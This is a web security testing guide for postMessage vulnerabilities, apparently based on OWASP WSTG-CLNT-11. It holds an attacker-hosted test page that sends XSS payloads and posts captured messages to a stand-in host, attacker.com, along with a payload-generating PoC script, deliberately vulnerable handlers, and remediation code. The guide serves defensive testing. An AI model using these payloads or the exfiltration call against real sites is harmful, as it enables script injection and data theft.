# WSTG-CLNT-11: Testing Web Messaging

## Test ID
WSTG-CLNT-11

## Test Name
Testing Web Messaging

## High-Level Description

HTML5 Web Messaging (postMessage API) allows cross-origin communication between windows/frames. Vulnerabilities arise when messages are sent without proper origin validation or when received messages are processed without sanitization, leading to XSS or data leakage.

---

## What to Check

- [ ] postMessage origin validation
- [ ] Message data sanitization
- [ ] Sensitive data in messages
- [ ] Wildcard (*) targetOrigin
- [ ] Message handler implementation

---

## How to Test

### Step 1: Identify postMessage Usage

```javascript
// Browser console - Find postMessage listeners
// Check for message event listeners
const listeners = getEventListeners(window);
console.log('Message listeners:', listeners.message);

// Monitor postMessage calls
const originalPostMessage = window.postMessage;
window.postMessage = function(message, targetOrigin, transfer) {
    console.log('postMessage called:');
    console.log('  Message:', message);
    console.log('  Target Origin:', targetOrigin);
    console.log('  Transfer:', transfer);
    return originalPostMessage.apply(this, arguments);
};

// Monitor incoming messages
window.addEventListener('message', function(event) {
    console.log('Message received:');
    console.log('  Origin:', event.origin);
    console.log('  Data:', event.data);
    console.log('  Source:', event.source);
}, true);
```

### Step 2: Test Origin Validation

```html
<!-- Host on attacker.com to test origin validation -->
<!DOCTYPE html>
<html>
<head>
    <title>postMessage Origin Test</title>
</head>
<body>
    <h1>postMessage Security Test</h1>
    <iframe id="target" src="https://target.com/page-with-postmessage"></iframe>

    <script>
        const iframe = document.getElementById('target');

        iframe.onload = function() {
            // Test 1: Send message to see if origin is validated
            iframe.contentWindow.postMessage('test_message', '*');

            // Test 2: Send XSS payload
            iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');

            // Test 3: Send JSON payload
            iframe.contentWindow.postMessage(JSON.stringify({
                action: 'getData',
                id: '../../admin'
            }), '*');
        };

        // Listen for responses
        window.addEventListener('message', function(event) {
            console.log('Response from:', event.origin);
            console.log('Data:', event.data);

            // Exfiltrate to attacker server
            fetch('https://attacker.com/log', {
                method: 'POST',
                body: JSON.stringify({
                    origin: event.origin,
                    data: event.data
                })
            });
        });
    </script>
</body>
</html>
```

### Step 3: Web Messaging Security Tester

```python
#!/usr/bin/env python3
"""
Web Messaging Security Analyzer
Analyzes JavaScript for postMessage vulnerabilities
"""

import re
import requests
from urllib.parse import urljoin

class WebMessagingTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def fetch_scripts(self):
        """Fetch page and extract JavaScript"""
        print(f"[*] Fetching {self.url}")

        response = requests.get(self.url)
        html = response.text

        # Find inline scripts
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)

        # Find external scripts
        external_scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', html)

        all_js = '\n'.join(inline_scripts)

        for script_url in external_scripts:
            full_url = urljoin(self.url, script_url)
            try:
                js_response = requests.get(full_url)
                all_js += '\n' + js_response.text
            except:
                pass

        return all_js

    def analyze_postmessage(self, js_code):
        """Analyze postMessage usage"""
        print("\n[*] Analyzing postMessage usage...")

        # Check for postMessage calls
        postmessage_calls = re.findall(
            r'\.postMessage\s*\([^)]+,\s*["\'](\*|[^"\']+)["\']',
            js_code
        )

        for target_origin in postmessage_calls:
            if target_origin == '*':
                print(f"[VULN] postMessage with wildcard targetOrigin (*)")
                self.findings.append({
                    "issue": "postMessage uses wildcard targetOrigin",
                    "severity": "Medium",
                    "detail": "Messages can be received by any origin"
                })

    def analyze_message_handler(self, js_code):
        """Analyze message event handlers"""
        print("\n[*] Analyzing message handlers...")

        # Find addEventListener for 'message'
        handlers = re.findall(
            r'addEventListener\s*\(\s*["\']message["\']\s*,\s*function\s*\([^)]*\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}',
            js_code,
            re.DOTALL
        )

        for handler in handlers:
            # Check for origin validation
            if not re.search(r'\.origin\s*[!=]==?\s*["\']', handler):
                print(f"[VULN] Message handler without origin validation")
                self.findings.append({
                    "issue": "No origin validation in message handler",
                    "severity": "High",
                    "detail": "Messages from any origin are processed"
                })

            # Check for dangerous sinks
            dangerous_patterns = [
                (r'innerHTML\s*=', "innerHTML assignment"),
                (r'document\.write', "document.write"),
                (r'eval\s*\(', "eval execution"),
                (r'setTimeout\s*\([^,]*data', "setTimeout with data"),
                (r'location\s*=', "location assignment"),
            ]

            for pattern, description in dangerous_patterns:
                if re.search(pattern, handler):
                    print(f"[VULN] Dangerous sink in message handler: {description}")
                    self.findings.append({
                        "issue": f"Dangerous sink: {description}",
                        "severity": "High",
                        "detail": "Message data used in dangerous sink"
                    })

    def run_analysis(self):
        """Run full analysis"""
        js_code = self.fetch_scripts()
        self.analyze_postmessage(js_code)
        self.analyze_message_handler(js_code)

        print("\n" + "="*50)
        print("WEB MESSAGING SECURITY REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo obvious vulnerabilities found.")
            print("Note: Manual testing is still recommended.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['issue']}")
                print(f"  Detail: {f['detail']}")

    def generate_poc(self):
        """Generate PoC HTML"""
        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>postMessage PoC</title>
</head>
<body>
    <h1>Web Messaging Test</h1>
    <iframe id="target" src="{self.url}"></iframe>

    <div id="results"></div>

    <script>
        const iframe = document.getElementById('target');
        const results = document.getElementById('results');

        // Payloads to test
        const payloads = [
            'test',
            '<script>alert(1)<\\/script>',
            '<img src=x onerror=alert(1)>',
            '{{"action":"admin","data":"test"}}',
            'javascript:alert(1)'
        ];

        iframe.onload = function() {{
            payloads.forEach((payload, i) => {{
                setTimeout(() => {{
                    iframe.contentWindow.postMessage(payload, '*');
                    console.log('Sent:', payload);
                }}, i * 500);
            }});
        }};

        window.addEventListener('message', function(event) {{
            const p = document.createElement('p');
            p.innerHTML = 'Origin: ' + event.origin + '<br>Data: ' +
                         JSON.stringify(event.data).substring(0, 100);
            results.appendChild(p);
        }});
    </script>
</body>
</html>'''
        return poc

# Usage
tester = WebMessagingTester("https://target.com/page")
tester.run_analysis()
print("\n\nPoC HTML:")
print(tester.generate_poc())
```

### Step 4: Common Vulnerable Patterns

```javascript
// VULNERABLE: No origin check
window.addEventListener('message', function(event) {
    // Processes messages from ANY origin
    document.getElementById('output').innerHTML = event.data;
});

// VULNERABLE: Weak origin check (can be bypassed)
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('trusted.com') !== -1) {
        // Bypassed with: attacker-trusted.com or trusted.com.attacker.com
        eval(event.data);
    }
});

// VULNERABLE: Wildcard targetOrigin
targetWindow.postMessage(sensitiveData, '*');
// Any window can receive this message
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser DevTools | Monitor postMessage traffic |
| Burp Suite | Intercept and analyze messages |
| PMHook | Browser extension for postMessage monitoring |
| Custom PoC | Test specific vulnerabilities |

---

## Remediation

```javascript
// SECURE: Proper origin validation
window.addEventListener('message', function(event) {
    // Strict origin check
    const allowedOrigins = ['https://trusted.com', 'https://app.trusted.com'];

    if (!allowedOrigins.includes(event.origin)) {
        console.warn('Rejected message from:', event.origin);
        return;
    }

    // Validate message structure
    let data;
    try {
        data = JSON.parse(event.data);
    } catch (e) {
        console.warn('Invalid message format');
        return;
    }

    // Validate expected properties
    if (!data.action || typeof data.action !== 'string') {
        return;
    }

    // Safe processing with allowlist
    const allowedActions = ['getData', 'updateUI'];
    if (allowedActions.includes(data.action)) {
        processMessage(data);
    }
});

// SECURE: Specific targetOrigin
const targetOrigin = 'https://trusted.com';
targetWindow.postMessage(JSON.stringify({action: 'update'}), targetOrigin);

// SECURE: Sanitize before DOM insertion
function processMessage(data) {
    const sanitized = DOMPurify.sanitize(data.content);
    document.getElementById('output').textContent = sanitized;
}
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| No origin validation + XSS sink | 8.1 | High |
| Wildcard targetOrigin with sensitive data | 6.5 | Medium |
| Weak origin validation | 5.4 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-346** | Origin Validation Error |
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |

---

## References

- [OWASP Testing Guide - Web Messaging](https://owasp.org/www-project-web-security-testing-guide/)
- [MDN - Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [HTML5 Security Cheatsheet](https://html5sec.org/)

---

## Checklist

```
[ ] postMessage usage identified
[ ] Origin validation tested
[ ] Message handlers analyzed
[ ] targetOrigin values checked
[ ] XSS via message data tested
[ ] PoC created
[ ] Findings documented
```
